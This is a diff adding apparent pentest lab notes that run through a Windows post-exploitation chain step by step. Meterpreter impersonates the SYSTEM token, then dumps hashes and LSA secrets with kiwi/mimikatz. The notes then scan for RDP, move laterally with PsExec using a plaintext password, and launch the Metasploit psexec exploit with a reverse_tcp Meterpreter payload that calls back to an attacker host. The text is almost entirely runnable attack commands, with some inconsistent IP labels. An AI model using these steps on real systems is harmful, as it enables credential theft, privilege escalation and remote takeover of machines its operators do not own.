@@ -18,3 +18,45 @@ meterpreter > getprivs
 meterpreter > getuid
 meterpreter > load_incognito
 meterpreter > list_tokens -u
+meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
+meterpreter > getuid               #(NT AUTHORITY\SYSTEM)
+meterpreter > hashdump             #(hashes)
+meterpreter > load kiwi            #(mimikatz) 
+meterpreter > lsa_dump_secrets
+meterpreter > shell
+
+C:\Windows
+
+meterpreter > background
+msf6 > search RDP
+msf6 > use auxiliary/scanner/rdp/rdp_scanner
+msf6 auxiliary(scanner/rdp/rdp_scanner) > show options
+msf6 auxiliary(scanner/rdp/rdp_scanner) > set RHOST 10.10.10.10 (target)
+msf6 auxiliary(scanner/rdp/rdp_scanner) > set RDP_CLIENT_IP 10.10.10.10 (attack)
+msf6 auxiliary(scanner/rdp/rdp_scanner) > run
+
+#(Launch Remimna with 10.10.10.10 (target))
+#(add username = Administrator + pw (find on the lsa_dump_secrets) = success!)
+
+#(DL SysInternals PsExec on a Windowns VM)
+
+C:\PSTools > PsExec64.exe \\192.168.2.109 -u Administrator -p Passw0rd! ipconfig
+C:\PSTools > PsExec64.exe \\192.168.2.109 -u Administrator -p Passw0rd! cmd.exe
+
+C:\Windows\system32 > whoami           #(the target Win  VM)
+C:\Windows\system32 > net user
+
+meterpreter > background
+
+msf6 > use Psexec
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/psexec) > show options
+msf6 exploit(windows/smb/psexec) > set LPORT 4443
+msf6 exploit(windows/smb/psexec) > set LHOST 10.10.10.10 (attacker)
+msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
+msf6 exploit(windows/smb/psexec) > set SMBPass qiwdqiowhdcoiqwhcdoioq91384 #(admin hashdump)
+msf6 exploit(windows/smb/psexec) > set RHOST 10.10.10.10. (target)
+msf6 exploit(windows/smb/psexec) > run
+
+meterpreter > getuid                #(NT AUTHORITY\SYSTEM)
